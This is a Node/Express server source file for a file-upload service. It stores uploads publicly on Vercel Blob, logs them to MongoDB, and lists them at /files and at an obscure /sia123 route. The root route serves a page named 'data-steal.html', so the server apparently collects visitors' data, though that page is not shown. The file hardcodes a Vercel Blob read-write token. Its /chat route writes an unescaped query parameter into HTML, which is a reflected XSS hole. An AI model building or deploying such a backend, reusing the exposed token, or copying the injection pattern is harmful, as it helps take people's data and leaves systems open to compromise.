import express from "express";
import cors from "cors";
import path from "path";
import { put } from "@vercel/blob";
import connectToDatabase from "./database.js";
import fs from "fs";

import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();

const db = await connectToDatabase();

app.use(cors());
app.use(express.json({ limit: "10mb" })); // Adjust the limit as needed


// File upload endpoint
import multer from 'multer';
const upload = multer({ storage: multer.memoryStorage() });

app.post("/upload", upload.single('file'), async (req, res) => {
    if (!req.file) {
        return res.status(400).json({
            success: false,
            message: "No file uploaded"
        });
    }

    const file = req.file.buffer; // Use buffer from multer
    const fileName = `file-${Date.now()}.txt`;

    try {
        const { url } = await put(fileName, file, {
            access: "public",
            contentType: "text/plain",
            token: "vercel_blob_rw_EHjzsv3fssHsBFXB_ykern8COSiNIFPvQrLI43HxgZr4FQc"
        });

        db.collection("files").insertOne({
            name: fileName,
            url: url
        })

        res.status(200).json({
            "url": url
        })

        
    } catch (error) {
        console.error("Upload error:", error);
        res.status(500).json({
            success: false,
            message: error.message
        });
    }
});

// Get list of uploaded files
app.get("/files", async (req, res) => {
    try {
        const collection = db.collection("files");
        const files = await collection.find().toArray();

        res.json({
            success: true,
            files: files
        });
    } catch (error) {
        console.error("Error retrieving files from MongoDB Atlas:", error);
        res.status(500).json({
            success: false,
            message: "Error retrieving files"
        });
    }
});

// Serve the HTML interface
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "data-steal.html"));
});

app.get("/sia123", (req, res) => {
    res.sendFile(path.join(__dirname, "files-list.html"));
});

app.get("/chat", async (req, res) => {
    const { url } = req.query;
    console.log(url);
    
    try {
        fs.readFile(path.join(__dirname, "chat.html"), "utf8", (err, data) => {
            if (err) {
                console.error("Error reading HTML file:", err);
                res.status(500).send("Internal Server Error");
                return;
            }
            const modifiedData = data.replace("chatUrlToBeReplacedByBackend", url);
    
            res.send(modifiedData);
        });
    } catch (error) {
        res.status(500).send('Error processing chat URL');
    }
});


const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server running on http://chat-wrapper-nu.vercel.app/${PORT}`);
});